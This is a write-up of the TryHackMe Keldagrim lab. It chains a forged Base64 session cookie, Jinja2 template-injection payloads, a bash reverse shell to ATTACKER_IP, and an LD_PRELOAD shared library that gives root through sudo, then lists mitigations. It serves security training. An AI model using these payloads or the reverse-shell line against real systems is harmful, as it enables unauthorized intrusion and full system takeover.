# Keldagrim

The dwarves are hiding their gold!

Can you overcome the forge and steal all of the gold!

Room: https://tryhackme.com/room/keldagrim

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/keldagrim.md

-----------------------

# TryHackMe — Keldagrim Write-Up

## Overview

Keldagrim is a Linux web challenge involving:

1. An unsigned, forgeable Base64 session cookie
2. Access-control bypass to the admin panel
3. Jinja2 Server-Side Template Injection through the `sales` cookie
4. Remote command execution and a reverse shell as `jed`
5. Privilege escalation through `sudo` preserving `LD_PRELOAD`

> Replace `MACHINE_IP` with the target IP and `ATTACKER_IP` with your AttackBox or VPN IP.

---

## Enumeration

A full TCP scan found SSH and a Werkzeug web server:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt MACHINE_IP
```

Relevant results:

```text
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp open  http  Werkzeug/3.0.6 Python/3.8.10
```

Directory enumeration revealed several routes:

```bash
gobuster dir \
  -u http://MACHINE_IP \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js,bak,zip \
  -o gobuster-medium-ext.txt
```

Interesting paths included:

```text
/admin
/services
/team
/wow
/runescape
```

---

## Analysing the Session Cookie

The application issued the following cookie:

```text
session=WjNWbGMzUT0=
```

Decoding it twice revealed `guest`:

```bash
printf '%s' 'WjNWbGMzUT0=' | base64 -d | base64 -d
```

Output:

```text
guest
```

This suggested that the session value was only Base64 encoded and lacked any cryptographic signature or integrity protection.

Encoding `admin` once produced:

```bash
printf '%s' 'admin' | base64 -w0
```

Output:

```text
YWRtaW4=
```

Supplying that value to `/admin` granted access to the admin panel:

```bash
curl -s 'http://MACHINE_IP/admin' \
  -H 'Cookie: session=YWRtaW4='
```

The response now contained:

```html
<title> Admin Panel </title>
```

This confirmed an authentication or authorization bypass through a forgeable session cookie.

---

## Discovering the `sales` Cookie

The admin page displayed a value for the current user. The application also used a cookie named `sales`.

A normal value looked like:

```text
sales=SkRJc01UWTE=
```

Decoding it twice revealed:

```bash
printf '%s' 'SkRJc01UWTE=' | base64 -d | base64 -d
```

Output:

```text
$2,165
```

Because the value was reflected into the admin page, it was tested for template injection.

---

## Confirming Jinja2 SSTI

The Jinja2 arithmetic expression was Base64 encoded:

```bash
TEST=$(printf '%s' '{{7*7}}' | base64 -w0)
echo "$TEST"
```

Output:

```text
e3s3Kjd9fQ==
```

The payload was then supplied through the `sales` cookie:

```bash
curl -s 'http://MACHINE_IP/admin' \
  -H "Cookie: session=YWRtaW4=; sales=$TEST" |
grep -A3 'Current user'
```

The response contained:

```text
Current user -
49
```

Because `{{7*7}}` was evaluated rather than displayed literally, Jinja2 Server-Side Template Injection was confirmed.

---

## Remote Command Execution

The following Jinja2 payload accessed Python globals, imported `os`, and executed a system command:

```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

It could be tested with:

```bash
PAYLOAD="{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
ENCODED=$(printf '%s' "$PAYLOAD" | base64 -w0)

curl -s 'http://MACHINE_IP/admin' \
  -H "Cookie: session=YWRtaW4=; sales=$ENCODED" |
grep -A4 'Current user'
```

This established command execution as the web-service user.

---

## Reverse Shell

Start a listener on the AttackBox:

```bash
nc -lvnp 4444
```

Create and send a reverse-shell payload:

```bash
PAYLOAD="{{request.application.__globals__.__builtins__.__import__('os').popen(\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\").read()}}"

ENCODED=$(printf '%s' "$PAYLOAD" | base64 -w0)

curl -s 'http://MACHINE_IP/admin' \
  -H "Cookie: session=YWRtaW4=; sales=$ENCODED"
```

A shell connected back as `jed`:

```text
jed@ip-MACHINE:~/app$
```

The user flag was stored in the home directory:

```bash
cd ~
cat user.txt
```

```text
thm{d55ac4d0---------------b999e73cf3}
```

---

## Privilege Escalation Enumeration

Checking sudo permissions revealed:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for jed:
    env_keep+=LD_PRELOAD

User jed may run the following commands:
    (ALL : ALL) NOPASSWD: /bin/ps
```

The important combination was:

- `jed` could run `/bin/ps` as root without a password
- `sudo` preserved the attacker-controlled `LD_PRELOAD` environment variable

`LD_PRELOAD` allows a shared library to be loaded before the program's normal libraries. Because `/bin/ps` would run as root through `sudo`, code in the supplied library would also execute as root.

---

## Exploiting `LD_PRELOAD`

Create a malicious shared-library source file:

```bash
cat > /tmp/preload.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>

void _init(void)
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF
```

Compile it:

```bash
gcc -fPIC -shared -nostartfiles \
  -o /tmp/preload.so /tmp/preload.c
```

Run the permitted command while loading the malicious library:

```bash
sudo LD_PRELOAD=/tmp/preload.so /bin/ps
```

The library executed before `/bin/ps`, spawning a root shell.

Verify access:

```bash
id
whoami
```

Then read the root flag:

```bash
cd /root
cat root.txt
```

```text
thm{bf2a087---------------c3aec5}
```

---

## Attack Chain

```text
Werkzeug web application
        ↓
Forge unsigned Base64 session cookie
        ↓
Access /admin as admin
        ↓
Control reflected Base64 sales cookie
        ↓
Jinja2 SSTI: {{7*7}} → 49
        ↓
Python os.popen command execution
        ↓
Reverse shell as jed
        ↓
sudo preserves LD_PRELOAD
        ↓
Load malicious shared library into sudo /bin/ps
        ↓
Root shell
```

---

## Vulnerabilities

### Forgeable session cookie

Base64 is an encoding mechanism, not a security control. The application trusted a client-controlled role or username without signing the cookie.

**Mitigation:**

- Use cryptographically signed session cookies
- Store authorization state server-side
- Never trust client-controlled role values

### Server-Side Template Injection

The decoded `sales` cookie was rendered as a Jinja2 template, allowing arbitrary template expressions and eventually Python command execution.

**Mitigation:**

- Treat cookie values as untrusted input
- Never pass untrusted data into `render_template_string`
- Render values as data through a fixed template
- Apply strict validation and output escaping

### Unsafe sudo environment preservation

Preserving `LD_PRELOAD` while allowing a user to execute a root command made arbitrary root code execution possible.

**Mitigation:**

- Remove `LD_PRELOAD` from `env_keep`
- Keep sudo's default environment sanitisation
- Grant only narrowly scoped commands with safe arguments
- Avoid unnecessary `NOPASSWD` rules
